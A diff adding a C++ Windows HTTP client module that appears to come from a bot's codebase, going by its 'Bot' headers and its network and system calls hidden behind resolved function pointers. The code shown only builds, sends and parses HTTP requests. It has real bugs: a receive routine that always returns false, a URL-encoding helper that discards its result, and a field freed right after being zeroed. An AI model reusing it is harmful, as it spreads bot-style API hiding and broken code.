@@ -1,0 +1,900 @@
+#include <windows.h>
+
+#include "Strings.h"
+#include "Memory.h"
+#include "BotClasses.h"
+#include "GetApi.h"
+#include "BotHTTP.h"
+
+//---------------------------------------------------------------------------
+
+bool IsWow64()
+{
+  BOOL bIsWow64 = FALSE;
+
+  typedef BOOL (APIENTRY *LPFN_ISWOW64PROCESS)
+    (HANDLE, PBOOL);
+
+  LPFN_ISWOW64PROCESS fnIsWow64Process;
+
+  HMODULE module = GetModuleHandle(L"kernel32");
+  const char funcName[] = "IsWow64Process";
+  fnIsWow64Process = (LPFN_ISWOW64PROCESS)
+    GetProcAddress(module, funcName);
+
+  if(NULL != fnIsWow64Process)
+  {
+    if (!fnIsWow64Process(GetCurrentProcess(),&bIsWow64))
+	{}// throw std::exception("Unknown error");
+  }
+  return bIsWow64 != FALSE;
+}
+PHTTPRequest HTTPCreateRequest(PCHAR URL)
+{
+	// Создать структуру запроса
+	PHTTPRequest R = CreateStruct(THTTPRequest);
+	R->Method = hmGET;
+
+	if (URL != NULL)
+	{
+		PURL UR = CreateStruct(TURL);
+		if (ParseURL(URL, UR, false))
+		{
+			// Переносим параметры
+			R->Host = UR->Host;
+			R->Path = UR->Path;
+			R->Port = UR->Port;
+			UR->Path = NULL;
+			UR->Host = NULL;
+		}
+
+		ClearURL(UR);
+		FreeStruct(UR);
+    }
+
+	if (R->Port == 0)
+		R->Port = PortHTTP;
+	return R;
+}
+//---------------------------------------------------------------------------
+
+PHTTPResponse HTTPCreateRespomse()
+{
+	// Создать структуру отыета
+	return (PHTTPResponse)MemHeapAlloc(sizeof(THTTPResponse));
+}
+//---------------------------------------------------------------------------
+
+void HTTPFreeRequest(PHTTPRequest Request)
+{
+	// Создать структуру запроса
+	if (Request == NULL)
+		return;
+	HTTPClearRequest(Request);
+	MemHeapFree(Request);
+}
+//---------------------------------------------------------------------------
+
+void HTTPFreeRespomse(PHTTPResponse Response)
+{
+	// Создать структуру отыета
+	if (Response == NULL)
+		return;
+	HTTPClearResponse(Response);
+	MemHeapFree(Response);
+}
+//---------------------------------------------------------------------------
+
+void HTTPClearRequest(PHTTPRequest Request)
+{
+	// Функция очищает структуру HTTP запроса
+	if (Request == NULL)
+		return;
+
+	Request->Method = hmUnknown;
+	Request->ContentLength = 0;
+
+	StrFree2(Request->Host);
+	StrFree2(Request->Path);
+	StrFree2(Request->Referer);
+	StrFree2(Request->Accept);
+	StrFree2(Request->AcceptLanguage);
+	StrFree2(Request->ProxyConnection);
+	StrFree2(Request->UserAgent);
+	StrFree2(Request->Cookie);
+	StrFree2(Request->ContentType);
+	StrFree2(Request->Connection);
+	StrFree2(Request->PostData);
+	StrFree2(Request->ContentLength);
+}
+//---------------------------------------------------------------------------
+
+void SetDefaultPort(PHTTPRequest R)
+{
+	// Устанавливаем порт по умолчанию, если в запросе не установлен
+	if (R->Port == 0)
+		R->Port = PortHTTP;
+}
+
+void SetParam(PCHAR &Attr, PCHAR Value)
+{
+	// инициализировать параметр. если он нулевой
+	if (Attr == NULL)
+		Attr = StrNew(Value);
+}
+
+void HTTPInitializeRequest(PHTTPRequest Request)
+{
+	// Функция заполняет не указанные поля структуры запроса стандартными данными
+	if (Request == NULL)
+		return;
+
+	if (Request->UserAgent == NULL)
+	{
+		DWORD BufSize = 1024;
+		PCHAR Buf = StrAlloc(BufSize);
+		pObtainUserAgentString( 0, Buf, &BufSize);
+		Request->UserAgent = StrNew(Buf);
+		StrFree(Buf);
+	}
+
+	SetDefaultPort(Request);
+	SetParam(Request->Accept, DefaultAccept);
+	SetParam(Request->AcceptLanguage, DefaultAcceptLanguage);
+	SetParam(Request->Connection, DefaultConnection);
+	if (Request->Method == hmPOST)
+	{
+		SetParam(Request->ContentType, FormDataURLEncoded);
+		if (Request->ContentLength == NULL)
+		{
+			// Раситываем длину данных
+			DWORD Size = StrCalcLength(Request->PostData);
+			if (Size)
+                Request->ContentLength = StrLongToString(Size);
+		}
+	}
+}
+
+void HTTPSetRequestURL(PHTTPRequest Request, PCHAR URL)
+{
+	// Заполнить  структуру запроса данными из адреса
+
+}
+//---------------------------------------------------------------------------
+
+void HTTPClearResponse(PHTTPResponse Response)
+{
+	// Функция очищает структуру HTTP ответа
+	Response->Code = 0;
+	Response->ContentLength = 0;
+
+	StrFree2(Response->ContentType);
+	StrFree2(Response->Connection);
+	StrFree2(Response->Location);
+}
+//---------------------------------------------------------------------------
+
+void AddParam(PStrings S, PCHAR Name, PCHAR Value, bool Valid = true)
+{
+	// В случае если Valid == true и значение не равно NULL добавляем
+	// Значение в список
+	if (Valid && !StrIsEmpty(Value))
+		StringsAddValue(S, Name, Value, ValueDelimeter);
+}
+
+PCHAR HTTPBuildRequest(PHTTPRequest Request)
+{
+	// Вункция собирает строку запроса
+	if (Request == NULL)
+		return NULL;
+
+    HTTPInitializeRequest(Request);
+
+	 // Собираем первую строку запроса
+	PCHAR Top = GetMethodStr(Request->Method);
+	if (Top == NULL)
+		return NULL;
+
+	PStrings S = StringsCreate();
+
+
+	StrConcat(Top, 4, " /", Request->Path, " ", HTTPProtocolVersion_1_1);
+	StringsAdd(S, Top);
+    StrFree(Top);
+
+	// Добавляем параметры
+	AddParam(S, ParamAccept, Request->Accept);
+	AddParam(S, ParamUserAgent, Request->UserAgent);
+	AddParam(S, ParamReferer, Request->Referer);
+	AddParam(S, ParamHost, Request->Host);
+	AddParam(S, ParamConnection, Request->Connection);
+	if (Request->Method == hmPOST)
+	{
+		// Добавляем информацию о пост данных
+		AddParam(S, ParamContentType, Request->ContentType);
+		AddParam(S, ParamContentLength, Request->ContentLength);
+	}
+
+	// Добавляем заверщающие строки
+	StringsAdd(S, "");
+	if (Request->Method == hmPOST)
+	{
+		// Добавляем POST данные
+		StringsAdd(S, Request->PostData);
+        StringsAdd(S, "");
+	}
+
+	PCHAR Result = StringsGetText(S);
+	StringsFree(S);
+	return Result;
+}
+//---------------------------------------------------------------------------
+
+PCHAR GetMethodStr(THTTPMethod Kind)
+{
+ // получить строку метода по номеру
+	 switch (Kind) {
+		case hmGET:
+			return StrNew(HTTPMethodGET);
+		case hmPOST:
+			return StrNew(HTTPMethodPOST);
+		case hmHEAD:
+			return StrNew(HTTPMethodHEAD);
+	 default:
+	 	return NULL;
+		 ;
+	 }
+}
+
+PCHAR URLEncode(PCHAR URL)
+{
+	// Функция кодирует URL строку
+
+	DWORD Len = StrCalcLength(URL);
+	if (Len == 0)
+		return NULL;
+
+	char Hex[] = "0123456789ABCDEF";
+
+    // Резервируем временный буфер
+	PCHAR Buf = StrAlloc(Len*3);
+	if ( Buf == NULL )
+		return NULL;
+	//
+
+	char *p;
+	char *r;
+	char Code;
+    // Кодируем строку
+	for ( p = URL, r = Buf; *p != 0; p++ )
+	{
+		if ( ( *p >= 'A' && *p <= 'Z' ) ||
+			 ( *p >= 'a' && *p <= 'z' ) ||
+			 ( *p >= '0' && *p <= '9' ) )
+		{
+			*(r++) = *p;
+		}
+		else
+		{
+			*(r++) = '%';
+			Code = (*p >> 4);
+			Code = Code  & 0x0F;
+			*(r++) = Hex[Code];
+			Code = *p & 0xF;
+			*(r++) = Hex[Code];
+		}
+    }
+
+	// Возвращаем строку по фактическому размеру буфера
+	PCHAR Res = StrNew(Buf);
+    StrFree(Buf);
+	return Res;
+}
+
+// Функция ставит ноль на текущую позицию и смещает указатель за него
+#define IncStrEx(S) if(S != NULL){*S = 0; S++;}
+
+
+bool ParseURL(PCHAR URL, PURL Rec, bool FullPars)
+{
+	if (URL == NULL || Rec == NULL)
+		return false;
+
+	PCHAR Buf;
+
+	// Определяем протокол
+	Rec->Protocol = GetLeftStr(URL, "://");
+
+	// Создаём временный буфер
+	if (Rec->Protocol != NULL)
+	{
+		Buf = GetRightStr(URL, "://");
+		if (Buf == NULL)
+			return false;
+    }
+	else
+		Buf = StrNew(URL);
+
+	// Определяем указатели на вадные блоки
+	PCHAR PathPtr = StrScan(Buf, '/');
+	IncStrEx(PathPtr);
+
+	// Строка параметров
+	PCHAR ArgsPtr = NULL;
+	PCHAR DocPtr = NULL;
+	if (FullPars)
+	{
+		ArgsPtr = StrScan(PathPtr, '?');
+		IncStrEx(ArgsPtr);
+
+		// Определяем документ
+		DocPtr = StrScanEnd(PathPtr, '/'); // Ищем последний слеш
+		if (DocPtr == NULL)
+		{
+			// Путь является документом
+			DocPtr = PathPtr;
+            PathPtr = NULL;
+		}
+		else
+        	IncStrEx(DocPtr);
+	}
+
+	// Строка хоста и порта
+	PCHAR HostPtr = Buf;
+	PCHAR PortPtr = StrScan(HostPtr, ':');
+	IncStrEx(PortPtr);
+
+	// Копируем строки
+	Rec->Host      = StrNew(HostPtr);
+	Rec->Path      = StrNew(PathPtr);
+	Rec->Document  = StrNew(DocPtr);
+	Rec->Port      = StrToInt(PortPtr);
+	Rec->Arguments = StrNew(ArgsPtr);
+
+
+	StrFree(Buf);
+	return true;
+}
+
+void ClearURL(PURL URL)
+{
+	if (URL == NULL)
+		return;
+
+	StrFree2(URL->Protocol);
+	StrFree2(URL->Host);
+	StrFree2(URL->Path);
+	StrFree2(URL->Document);
+	StrFree2(URL->Arguments);
+	StrFree2(URL->UserName);
+	StrFree2(URL->Password);
+	URL->Port = 0;
+}
+
+void AddURLParam(PStrings S, PCHAR Name, PCHAR Value)
+{
+	if (S == NULL || Name == NULL)
+		return;
+	PCHAR NewValue = URLEncode(Value);
+	StringsAddValue(S, Name, Value);
+	StrFree(NewValue);
+}
+
+//----------------------------------------------------------------------------
+//  Функции для загрузки страниц
+//----------------------------------------------------------------------------
+
+#define HTONS(x) (((x) << 8) | ((x) >> 8))
+
+SOCKET ConnectToHost(PCHAR Host, int Port)
+{
+	// Подключаемся к хосту
+
+	// Получаем  адрес по имени хоста
+	LPHOSTENT lpHost = (LPHOSTENT)pgethostbyname((const char*)Host);
+
+	if ( lpHost == NULL )
+		return SOCKET_ERROR;
+
+	// Открываем хост
+	SOCKET Socket = (SOCKET)psocket( AF_INET, SOCK_STREAM, 0 );
+
+	if( Socket == SOCKET_ERROR )
+		return Socket;
+
+	struct sockaddr_in SockAddr;
+
+	SockAddr.sin_family		 = AF_INET;
+	SockAddr.sin_addr.s_addr = **(unsigned long**)lpHost->h_addr_list;
+	SockAddr.sin_port		 = HTONS((unsigned short)Port );
+
+	// подключаемся к сокету
+	if ( (int)pconnect( Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) ) == SOCKET_ERROR )
+	{
+		pclosesocket( Socket );
+		return SOCKET_ERROR;
+	}
+	return Socket;
+}
+//----------------------------------------------------------------------------
+
+bool ReceiveData(SOCKET Sock, PCHAR &Header, PCHAR &Buf, DWORD &Len)
+{
+    // Прочитать данные из сокета
+	PReceiveBuf HeaderBuf = CreateReceiveBuf();
+
+	if (HeaderBuf == NULL)
+		return false;
+
+	DWORD DataSize = 1024;
+	LPVOID Data = MemHeapAlloc(DataSize);
+	int Size = 9;
+
+	bool Completed = false;
+    int DelPos;
+	// Получаем заголовок ответа
+	LPVOID PartBuf = NULL;
+    int PartSize = 0;
+ 	while (!Completed)
+	{
+		//
+		Size = (int)precv(Sock, Data, DataSize, 0);
+		if (Size == 0)
+			break;
+
+		// Определяем позицию разделителя
+		DelPos = StrPos((PCHAR)Data, LineBreak2);
+		if (DelPos >= 0)
+		{
+		   // Разделитель заголовка найден
+		   Completed = true;
+		   PartBuf = Data;
+		   DWORD L = StrCalcLength(LineBreak2);
+		   PartBuf = (LPVOID)((DWORD)PartBuf+ DelPos + L);
+		   PartSize = Size - DelPos - L;
+
+		   Size = DelPos;
+		}
+
+		AddReceiveData(HeaderBuf, Data, Size);
+	}
+
+	Header = BuildReceiveDataStr(HeaderBuf, Len);
+
+	FreeReceiveBuf(HeaderBuf);
+   //----------------------------------------
+
+	PReceiveBuf RecBuf = CreateReceiveBuf();
+
+	if (RecBuf == NULL)
+		return false;
+
+	// Записываем остаток кадра
+	if (PartSize > 0)
+    	AddReceiveData(RecBuf, PartBuf, PartSize);
+
+	// Получаем документ
+	do
+	{
+		Size = (int)precv(Sock, Data, DataSize, 0);
+		if (Size > 0)
+			AddReceiveData(RecBuf, Data, Size);
+	}
+	while (Size > 0);
+
+	Buf = BuildReceiveDataStr(RecBuf, Len);
+
+	MemHeapFree(Data);
+	FreeReceiveBuf(RecBuf);
+
+	return false;
+}
+
+bool HTTPExecuteMethod(PHTTPRequest Request, PCHAR *ResultBuf, DWORD *ResultSize)
+{
+	// Функция выполняет HTTP метод указанный в настройках запроса
+	if (ResultBuf != NULL)
+		*ResultBuf = NULL;
+	if (ResultSize != NULL)
+		*ResultSize = 0;
+	if (Request == NULL || Request->Host == NULL)
+		return false;
+
+	SetDefaultPort(Request);
+	
+	// Инициализируем библиотеку
+	WSADATA wsa;
+	if ( (int)pWSAStartup(MAKEWORD( 2, 2 ), &wsa ) != 0 )
+		return false;
+
+
+	// Подключаемся к хосту
+	SOCKET Sock = ConnectToHost(Request->Host, Request->Port);
+	if (Sock == SOCKET_ERROR)
+		return false;
+
+	// Отправлям данные
+	PCHAR SendBuf = HTTPBuildRequest(Request);
+	if (SendBuf == NULL)
+	{
+		pclosesocket(Sock);
+		return false;
+	}
+
+	if ((int)psend(Sock, SendBuf, StrLength(SendBuf), 0) != SOCKET_ERROR)
+	{
+		// Данные отправлены, читаем ответ
+		if (ResultBuf != NULL)
+		{
+			DWORD Size = 0;
+			PCHAR Headers = NULL;
+			ReceiveData(Sock, Headers, *ResultBuf, Size);
+            StrFree(Headers);
+
+			if (ResultSize != NULL)
+				*ResultSize = Size;
+
+        }
+    }
+
+	// Закрываем хост
+	pclosesocket(Sock);
+
+	return true;
+
+}
+
+bool HTTPGet(PCHAR URL, PCHAR *Buf)
+{
+	// Функция считаевает файл по адресу URL в буФер Buf
+	if (URL == NULL)
+		return false;
+
+	PHTTPRequest R = HTTPCreateRequest(URL);
+	bool Res = HTTPExecuteMethod(R, Buf, NULL);
+	HTTPFreeRequest(R);
+	return Res;
+}
+
+bool HTTPPost(PCHAR URL, PStrings Fields, PCHAR *Buf)
+{
+	// Отправить пост запрос на сервер
+	if (URL == NULL || Fields == NULL)
+		return false;
+
+	PHTTPRequest R = HTTPCreateRequest(URL);
+	R->Method = hmPOST;
+	R->PostData = StringsGetText(Fields, "&");
+    bool Res = HTTPExecuteMethod(R, Buf, NULL);
+	HTTPFreeRequest(R);
+	return Res;
+}
+
+//----------------------------------------------------------------------------
+
+//----------------------------------------------------------------------------
+//  Функции для работы с буфером принятых данных
+//----------------------------------------------------------------------------
+
+void FreeReceive(LPVOID Item)
+{
+	PReceive R = (PReceive)Item;
+	MemFree(R->Data);
+    FreeStruct(Item);
+}
+
+PReceiveBuf CreateReceiveBuf()
+{
+	PList List = ListCreate();
+    ListSetFreeItemMehod(List, FreeReceive);
+	return (PReceiveBuf)List;
+}
+
+void FreeReceiveBuf(PReceiveBuf Buf)
+{
+	ListFree((PList)Buf);
+}
+
+void AddReceiveData(PReceiveBuf Buf, LPVOID Data, DWORD Size, bool Copy)
+{
+	if (Buf == NULL || Data == NULL || Size == 0)
+		return;
+	PReceive R = CreateStruct(TReceive);
+	if (R == NULL)
+        return;
+
+	if (Copy)
+	{
+		R->Data = MemAlloc(Size);
+		m_memcpy(R->Data, Data, Size);
+	}
+	else
+		R->Data = Data;
+	R->Size = Size;
+	ListAdd(PList(Buf), R);
+}
+
+DWORD CalcTotalReceivedSize(PReceiveBuf Buf)
+{
+	// Подсчитать общий объём загруженных данных
+	if (Buf == NULL)
+		return 0;
+
+	PList List = (PList)Buf;
+	DWORD Count = ListGetCount(List);
+	if (Count == NULL)
+		return 0;
+
+	DWORD Size = 0;
+
+	// Подсчитываем общую длину буфера
+	for (DWORD i = 0; i < Count; i++)
+	{
+	   Size += PReceive(ListGetItem(List, i))->Size;
+	}
+	return Size;
+}
+
+void CopyReceivedDataToBuf(PReceiveBuf RList, LPVOID Buf)
+{
+	// Копировать загруженные данные в буфер
+	if (RList == NULL)
+		return;
+	PList List = (PList)RList;
+	DWORD Count = ListGetCount(List);
+	if (Count == NULL)
+		return;
+
+	PReceive R;
+
+	PCHAR Temp = (PCHAR)Buf;
+
+	for (DWORD i = 0; i < Count; i++)
+	{
+		R = (PReceive)ListGetItem(List, i);
+		m_memcpy(Temp, R->Data, R->Size);
+
+		Temp += R->Size;
+	}
+}
+
+LPBYTE BuildReceiveData(PReceiveBuf Buf, int &BufSize)
+{
+	// Собираем загруженые данные в один буфер
+	BufSize = CalcTotalReceivedSize(Buf);
+	if (BufSize == 0)
+		return NULL;
+
+	LPBYTE Result = (LPBYTE)MemAlloc(BufSize + 1);
+	if (Result == NULL)
+	{
+		BufSize = 0;
+		return NULL;
+    }
+	CopyReceivedDataToBuf(Buf, Result);
+	PCHAR Tmp = (PCHAR)Result + BufSize;
+	*Tmp = 0;
+	return Result;
+}
+
+
+PCHAR BuildReceiveDataStr(PReceiveBuf Buf, DWORD &BufSize)
+{
+	// Собрать данные в одну строку
+	BufSize = CalcTotalReceivedSize(Buf);
+	if (BufSize == 0)
+		return NULL;
+
+	PCHAR Result = StrAlloc(BufSize);
+	if (Result == NULL)
+	{
+		BufSize = 0;
+		return NULL;
+    }
+	CopyReceivedDataToBuf(Buf, Result);
+
+	return Result;
+}
+
+//--------------------------------------------------------------------------
+
+PCHAR GetEndLine(PCHAR Str)
+{
+	// Функция возвращает Указатель на последний символ строки
+	if (Str == NULL)
+		return NULL;
+
+	PCHAR C = Str;
+
+	while (*C != 0 && *C != 10 && *C != 13) C++;
+    return C;
+}
+
+PCHAR ScanLN(PCHAR S, char C, bool SetAfter = false)
+{
+	// Функция ищет символ до конца строки
+	if (S == NULL)
+		return NULL;
+	PCHAR T = S;
+	while ((*T != 0) && (*T != 10) && (*T != 13) && (*T != C)) T++;
+	if (*T == C)
+	{
+		if (SetAfter)
+            T++;
+		return T;
+	}
+	else
+		return NULL;
+}
+
+void IgnoreSpaces(PCHAR &S)
+{
+    // Игнорировать пробелы
+	if (S == NULL)
+		return;
+	while (*S != 0 && *S == ' ') S++;
+}
+
+PCHAR GetStrFromPtr(PCHAR Start, PCHAR End)
+{
+	// Получить строку между указателями
+	if (Start == NULL || End == NULL)
+		return NULL;
+	int Len = End - Start;
+	if (Len <= 0)
+		return NULL;
+	return StrNew(Start, Len);
+}
+
+bool IsKnownHTTPMethod(PCHAR Method)
+{
+
+	int Index = StrIndexOf(Method, true, 11, HTTPMethodGET,
+											HTTPMethodPOST,
+											HTTPMethodHEAD,
+											HTTPMethodPUT,
+											HTTPMethodDELETE,
+											HTTPMethodLINK,
+											HTTPMethodUNLINK,
+											HTTPMethodCONNECT,
+											HTTPMethodOPTIONS,
+											HTTPMethodPATCH,
+                                            HTTPMethodTRACE);
+	return Index >= 0;
+}
+
+
+#define ClearStrVar(S) if (S != NULL) *S = NULL
+
+
+// Методы анализа HTTP заголовков
+bool ParseRequestFirstLine(PCHAR Line, PCHAR *Method, PCHAR *Path, PCHAR *ProtVersion)
+{
+	// Разобрать превую строку запроса
+	ClearStrVar(Method);
+	ClearStrVar(Path);
+	ClearStrVar(ProtVersion);
+
+	if (Line == NULL)
+		return false;
+
+	// Определяем указатели на путь и протокол
+	PCHAR MethodPtr = ScanLN(Line, ' ');
+	PCHAR PathPtr = ScanLN(MethodPtr, '/', true);
+	PCHAR ProtPtr = ScanLN(PathPtr, ' ');
+	PCHAR EndL = GetEndLine(ProtPtr);
+
+	if (MethodPtr == NULL ||  PathPtr == NULL || ProtPtr == NULL)
+		return false;
+
+
+	PCHAR MethodName = GetStrFromPtr(Line, MethodPtr);
+	if (!IsKnownHTTPMethod(MethodName))
+	{
+		// Неизвестный метод запроса
+		StrFree(MethodName);
+		return false;
+    }
+
+	// Получаем метод
+	if (Method != NULL)
+		*Method = MethodName;
+	else
+		StrFree(MethodName);
+
+	// Получаем путь
+	if (Path != NULL)
+		*Path = GetStrFromPtr(PathPtr, ProtPtr);
+
+	// Получаем протокол
+	if (ProtVersion != NULL)
+	{
+		IgnoreSpaces(ProtPtr);
+		*ProtVersion = GetStrFromPtr(ProtPtr, EndL);
+    }
+
+	// Возвращаем итину если получены указатели на 3 блока
+	return true;
+}
+
+THTTPMethod GetMethodFromStr(PCHAR Method)
+{
+	// Функция возвращает тип метода по его названию
+	switch (StrIndexOf(Method, false, 3, HTTPMethodGET, HTTPMethodPOST, HTTPMethodHEAD)) 
+	{
+		case 0:
+			return hmGET;
+		case 1:
+			return hmPOST;
+		case 2:
+			return hmHEAD;	
+        
+    default:
+    	return hmUnknown;
+	} 
+}
+
+PCHAR GetHTTPHeaderValue(PCHAR Buf, PCHAR Name)
+{
+	// Функция возвращает значение заголовка
+	if (Buf == NULL || Name == NULL)
+		return NULL;
+		
+	DWORD Len = StrCalcLength(Name);
+	PCHAR Line = Buf; // Указатель на начало строки
+	PCHAR EndLN;      // Указатель на конец строки
+	PCHAR ValPTR;     // Указатель на разделитель ':'
+	
+	DWORD LBCount; // Количество символов разделения строк
+	
+	// Построчно перебираем буфер
+	while (*Line != 0)
+	{
+  		IgnoreSpaces(Line);
+		EndLN = GetEndLine(Line);
+		// Ишем позицию разделителя
+		
+		ValPTR = ScanLN(Line, ':', true);
+		if (ValPTR != NULL && StrSame(Line, Name, false, Len)) 
+		{
+			// Нашли совпадение имени
+			IgnoreSpaces(ValPTR);
+			return GetStrFromPtr(ValPTR, EndLN);
+		}
+
+		// Переходим на следующёю позицию
+		LBCount = 1;
+		Line = EndLN;
+		while (*Line != 0 && (*Line == 10 || *Line == 13)) 
+		{
+			Line++;
+			LBCount++;
+		}
+
+		// Если встретили 4 и больше разделителя(конец заголовка) то
+		// прерываем цикл
+		if (LBCount >= 4) break;
+			
+	}
+	return NULL;			
+}
+
+PCHAR GetURLEncodedPostData(PCHAR Buf)
+{
+	// Получить URL кодированные пост данные.
+
+	// Определяем позицию двойного разделителя строк и копируем данные
+	// до следующей строки
+
+	int Pos = StrPos(Buf, LineBreak2);
+
+	if (Pos < 0)
+	   return NULL;
+
+	Pos+=StrCalcLength(LineBreak2);
+
+	PCHAR Start = Buf + Pos;
+	PCHAR End = GetEndLine(Start);
+
+	return GetStrFromPtr(Start, End);;
+}
